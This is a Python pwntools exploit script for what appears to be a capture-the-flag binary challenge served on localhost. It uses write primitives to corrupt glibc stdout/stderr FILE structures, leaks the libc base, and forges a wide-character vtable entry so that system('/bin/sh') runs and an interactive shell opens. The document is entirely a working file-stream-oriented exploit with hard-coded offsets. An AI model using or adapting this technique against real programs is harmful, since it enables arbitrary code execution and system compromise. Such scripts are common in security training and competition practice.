from pwn import *

exe = ELF("./container/chall")
libc = ELF("./libc.so.6")

context.binary = exe

# io = process([exe.path])
# io = gdb.debug([exe.path], gdbscript="c")
io = remote("localhost", 50000)


def write_rel(offset, value, switch=False):
    io.sendlineafter(b"> ", b"yes" if switch else b"no")
    io.sendlineafter(b"> ", b"low")
    io.sendlineafter(b"> ", str(offset).encode())
    io.sendafter(b"> ", value)


def write_abs(offset, value, switch=False):
    io.sendlineafter(b"> ", b"yes" if switch else b"no")
    io.sendlineafter(b"> ", b"high")
    io.sendlineafter(b"> ", str(offset).encode())
    io.sendafter(b"> ", value)


STDERR_OFFSET = 0xE0  # offset between stdout and stderr in libc

# leak libc on stdout
write_abs(0x0 + STDERR_OFFSET, p64(0xFBAD1800))  # flags
write_abs(0x70 + STDERR_OFFSET, p64(1))  # _fileno
write_rel(0x10 + STDERR_OFFSET, p64(0x68))  # _IO_read_end
write_rel(0x20 + STDERR_OFFSET, p64(0x68))  # _IO_write_base
write_rel(0x28 + STDERR_OFFSET, p64(0x68 + 0x8))  # _IO_write_ptr


# switch back to stdout and trigger the fsop leak
io.sendlineafter(b"> ", b"yes")
leak = u64(io.recv(8).ljust(8, b"\x00"))
libc.address = leak - 0x1D4760
log.success(f"Libc base: {hex(libc.address)}")

# reset stdout
io.sendline(b"high")
io.sendline(b"0")
io.send(p64(0xFBAD2A84))
io.recvuntil(b"(max 8kg) > ", drop=True)

IO_WFILE_JUMPS = libc.address + 0x1D00A0
WIDE_DATA_OFFSET = 0x80  # 0x200
WIDE_VTABLE_OFFSET = 0x60  # 0x400

# forge vtable entry in wide mode in stdout to call system
# https://niftic.ca/posts/fsop
write_abs(0x0 + STDERR_OFFSET, b"/bin/sh\x00", switch=True)  # flags
# https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L1432
# offset 0x10 between seekoff and xsputn
write_abs(0xD8 + STDERR_OFFSET, p64(IO_WFILE_JUMPS + 0x10))  # vtable
write_rel(0xA0 + STDERR_OFFSET, p64(WIDE_DATA_OFFSET))  # _wide_data
write_rel(WIDE_DATA_OFFSET + 0xE0, p64(WIDE_VTABLE_OFFSET))  # _wide_vtable
write_abs(WIDE_DATA_OFFSET + 0x20, p64(1))  # _IO_write_ptr
# https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wfileops.c#L1021
write_abs(WIDE_VTABLE_OFFSET + 0x18, p64(libc.sym["system"]))  # _IO_overflow_t

# switch back to stdout and trigger system call and win
io.sendlineafter(b"> ", b"yes")

io.interactive()
